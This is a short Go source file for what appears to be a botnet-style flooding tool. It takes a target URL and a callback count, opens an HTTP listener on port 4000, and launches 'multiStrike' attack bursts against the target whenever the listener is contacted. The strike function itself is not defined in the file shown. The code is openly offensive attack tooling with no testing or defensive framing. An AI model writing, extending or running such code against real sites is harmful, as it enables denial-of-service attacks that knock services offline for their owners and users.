package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"
)

func createAndRunBotnet(url string, n uint64, c chan string) {
	port := "4000"
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		go multiStrike(url, n, c)
		fmt.Fprintf(w, "[RECV]")
	})
	http.ListenAndServe(":"+port, nil)
}

func main() {
	if len(os.Args) < 3 {
		panic("Forgot something maybe?")
	}
	TLCallbacks, typeError := strconv.ParseUint(os.Args[2], 0, 64)
	if typeError != nil {
		panic("Cannot understand supplied value of top level callbacks.")
	}

	url := os.Args[1] // TBD: Add test cases to validate URL structure
	c := make(chan string)

	go createAndRunBotnet(url, TLCallbacks, c)
	fmt.Println("[STANDBY] T minus 3 seconds...")
	time.Sleep(time.Second * 3)

	for i := uint64(0); i < TLCallbacks; i++ {
		fmt.Println("Listening for callbacks...")
		<-c
	}
	<-c
}
